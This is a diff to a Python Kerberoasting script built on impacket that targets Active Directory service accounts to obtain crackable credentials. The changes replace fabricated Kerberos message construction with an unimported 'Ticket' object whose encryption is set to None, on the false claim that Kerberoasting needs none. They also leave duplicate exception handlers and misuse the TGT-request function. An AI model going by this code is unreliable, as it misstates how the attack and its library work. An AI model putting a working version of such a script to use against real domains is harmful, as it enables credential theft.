@@ -1,7 +1,6 @@
 from impacket.krb5.types import Principal
 from impacket.smbconnection import SMBConnection
 from ldap3 import Server, Connection, SUBTREE
-from impacket.krb5.asn1 import AP_REQ, KRB_ENC_AS_REP_PART, KRB_CRED, EncKrbCredPart
 from impacket.krb5.ccache import CCache
 from impacket.krb5.crypto import Key
 from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive, sendReceiveSingle
@@ -43,36 +42,18 @@ def kerberoast_user(spn, domain):
         # Get a TGT for the specified user
         tgt = getKerberosTGT(domain, spn.split('/')[0], spn.split('@')[1])
 
-        # Construct a fake AP_REQ
-        tgt_enc_part = tgt['enc-part']
-        fake_ap_req = AP_REQ()
-        fake_ap_req['pvno'] = 5
-        fake_ap_req['msg-type'] = 14
-        fake_ap_req['ap-options'] = 0
-        fake_ap_req['ticket'] = tgt['ticket']
-        fake_ap_req['authenticator'] = None
-
-        # Construct a fake KRB_CRED
-        fake_krb_cred = KRB_CRED()
-        fake_krb_cred['pvno'] = 5
-        fake_krb_cred['msg-type'] = 22
-        fake_krb_cred['tickets'] = [tgt['ticket']]
-        fake_krb_cred['enc-part'] = EncKrbCredPart()
-
-        # Encrypt the fake KRB_CRED using the service key
-        krb_key = Key(f"krbtgt/{domain}@{domain}", tgt_enc_part['key']['keyvalue'])
-        fake_krb_cred_encrypted = krb_key.encrypt(fake_krb_cred.getData())
-
         # Construct the Kerberoast ticket
-        kerberoast_ticket = KRB_CRED()
-        kerberoast_ticket['pvno'] = 5
-        kerberoast_ticket['msg-type'] = 22
-        kerberoast_ticket['tickets'] = [tgt['ticket']]
-        kerberoast_ticket['enc-part'] = KRB_ENC_AS_REP_PART()
-        kerberoast_ticket['enc-part']['ticket-info'] = fake_krb_cred_encrypted
+        kerberoast_ticket = Ticket()
+
+        kerberoast_ticket['tgs-principal'] = Principal(spn)
+        kerberoast_ticket['enc-part'] = None  # No encryption for Kerberoasting
 
         # Return the Kerberoast ticket
-        return kerberoast_ticket.dump()
+        return kerberoast_ticket
+
+    except Exception as e:
+        print(f"Error during Kerberoasting for user {spn}: {e}")
+        return None
 
     except Exception as e:
         print(f"Error during Kerberoasting for user {spn}: {e}")
